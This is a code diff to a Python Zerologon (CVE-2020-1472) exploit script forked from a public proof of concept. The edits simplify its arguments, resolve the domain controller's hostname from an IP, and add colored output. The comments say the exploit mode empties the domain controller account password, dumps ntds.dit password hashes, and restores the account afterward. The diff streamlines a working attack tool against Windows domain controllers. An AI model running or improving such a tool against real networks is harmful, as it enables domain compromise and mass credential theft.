@@ -6,10 +6,12 @@
 # This is a modified project foked from:
 # https://github.com/dirkjanm/CVE-2020-1472
 #
-# It is used to identify and exploit
-# cve-2020-1472 aka zerologon
-# As well as exploit it and dump the ntds.dit
-# and restore the system account after
+# It is used to identify and/or exploit
+# CVE-2020-1472 aka zerologon.
+# 
+# If exploit choosen, it will change the system account password 
+# and dump the ntds.dit, then it restore the system account password
+# after it dumps all the password hashes
 # 
 # Resource:
 #   https://www.secura.com/pathtoimg.php?id=2055
@@ -66,8 +68,7 @@ banner = """
 
 """
 
-parser = argparse.ArgumentParser(description='Tests whether a domain controller is vulnerable to the Zerologon attack.\nResets the DC account password to an empty string when vulnerable.')
-parser.add_argument('dc_name', action='store', help="The (NetBIOS) computer name of the domain controller.")
+parser = argparse.ArgumentParser(description='Check if domain controller is vulnerable to the Zerologon attack aka CVE-2020-1472.\nResets the DC account password to an empty string when vulnerable.')
 parser.add_argument('dc_ip', action='store', help="IP Address of the domain controller.")
 parser.add_argument('-exploit', action='store_true',  help="Zero out the computer\'s hash")
 
@@ -218,17 +219,22 @@ def perform_attack(dc_handle, dc_ip, target_computer):
       print('Target vulnerable!\n')
 
   else:
-     print('\nAttack failed. Target is probably patched.')
+     print(GREEN+"\nAttack failed. Target is probably patched."+NOCOLOR)
      sys.exit(1)
 
 
 if __name__ == '__main__':
-  if not (3 <= len(sys.argv) <= 4):
+  if not (2 <= len(sys.argv) <= 3):
     #print( banner )
     parser.print_help()
     sys.exit(1)
   else:
     options = parser.parse_args()
-    options.dc_name = options.dc_name.rstrip('$')
-    perform_attack('\\\\' + options.dc_name, options.dc_ip, options.dc_name)
+
+    # get hostname from submitted IP then remove .local extensions from it
+    host = socket.gethostbyaddr(options.dc_ip)[0]
+    hostname = host.split('.')[0]
+
+    print(WHITE+"Checking hostname: "+YELLOW+hostname.upper()+NOCOLOR)
+    perform_attack('\\\\' + hostname , options.dc_ip, hostname)
 
